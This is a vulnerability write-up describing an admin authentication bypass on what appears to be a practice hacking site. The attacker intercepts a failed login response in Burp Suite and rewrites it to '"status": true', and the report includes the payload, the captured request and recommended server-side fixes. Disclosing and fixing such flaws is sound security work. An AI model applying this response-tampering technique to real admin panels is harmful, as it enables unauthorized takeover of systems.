# Admin Authentication Bypass Leading to Admin Account Takeover

## Vulnerability Type
Broken Authentication / Client-Side Trust of Server Response (OWASP A07:2021 - Identification and Authentication Failures)

## Summary
The admin login mechanism relies on the client trusting the JSON response body returned by the server to determine authentication status, instead of enforcing session state server-side. By intercepting the login response for a failed/invalid login attempt and modifying the `status` and message fields to reflect a successful login, an attacker can bypass authentication entirely and gain admin panel access without valid credentials.

## Vulnerable Endpoint
`POST https://hackarena.site/subdomains/adminpanel/?action=login`

## Steps to Reproduce
1. Go to the admin login page.
2. Turn on intercept in Burp Suite (or similar proxy).
3. Submit the login form with invalid/arbitrary credentials (e.g. `UserName: admin`, `Password: admin`).
4. Intercept the server's response to this login attempt.
5. Modify the response body fields to reflect a successful login:
   - Change `"status"` to `true`
   - Add/change the message field to `"Message": "success"` (or equivalent success indicator)
6. Forward the modified response to the client.
7. Observe that the application treats the session as authenticated, granting access to the admin panel, despite the credentials never being validated correctly server-side.

## Payload Used
Modified response forwarded in place of the failed-login response:
```json
{
    "status": true,
    "Message": "success"
}
```

## Proof of Concept Request
Request captured in Burp Suite:
```
POST /subdomains/adminpanel/?action=login HTTP/2
Host: hackarena.site
Content-Type: application/json

{
    "UserName": "admin",
    "Password": "admin"
}
```

## Impact
- Complete authentication bypass on the admin panel - valid admin credentials are not required to gain access.
- Full admin account takeover, since the application determines login success purely from client-visible response data rather than a server-enforced session/token.
- Grants an attacker unauthorized administrative control over the application, which may expose sensitive data, user management functions, and further privilege abuse.

## Recommendations for Fix
- Authentication decisions must be made and enforced entirely server-side (e.g., via a signed session token or server-stored session state) - never inferred from a response body the client can modify.
- Issue a cryptographically signed token (e.g., JWT with server-side signature verification, or an opaque session ID mapped server-side) upon successful login, and validate it on every subsequent request to the admin panel.
- Do not return a simple boolean `status` field as the sole indicator of authentication success; tie access to a server-validated session cookie/token instead.
- Implement account lockout/rate-limiting on repeated failed login attempts to the admin panel.
